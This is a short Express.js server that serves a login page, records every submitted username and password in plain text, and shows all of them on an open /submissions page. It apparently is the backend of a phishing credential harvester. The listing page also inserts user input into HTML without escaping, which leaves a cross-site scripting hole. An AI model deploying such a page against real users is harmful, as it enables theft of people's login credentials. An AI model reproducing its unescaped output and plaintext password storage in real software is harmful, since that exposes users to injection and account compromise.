const express = require('express');
const app = express();
const path = require('path');

app.use(express.urlencoded({ extended: true }));

// In-memory storage of submissions
const submissions = [];

// Serve the login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve static files (CSS, images)
app.use(express.static(path.join(__dirname)));

// Handle form submission
app.post('/submit', (req, res) => {
  const { username, password } = req.body;
  submissions.push({
    username,
    password,
    time: new Date().toLocaleString()
  });
  res.redirect('/submissions');
});

// Page to view all submissions
app.get('/submissions', (req, res) => {
  let listItems = submissions
    .map(
      (s) =>
        `<li><strong>${s.time}</strong> — Username: <em>${s.username}</em> | Password: <em>${s.password}</em></li>`
    )
    .join('');
  let html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>Submitted Logins</title>
      <style>
        body { font-family: Arial, sans-serif; background: #fafafa; padding: 2rem; }
        h1 { color: #333; }
        ul { list-style-type: none; padding: 0; }
        li { background: #fff; margin: 0.5rem 0; padding: 0.8rem; border-radius: 5px; box-shadow: 0 0 5px #ccc; }
        a { display: inline-block; margin-top: 1rem; text-decoration: none; color: #ea3333; font-weight: bold; }
        a:hover { text-decoration: underline; }
      </style>
    </head>
    <body>
      <h1>Submitted Logins</h1>
      <ul>${listItems}</ul>
      <a href="/">Back to login</a>
    </body>
    </html>
  `;
  res.send(html);
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
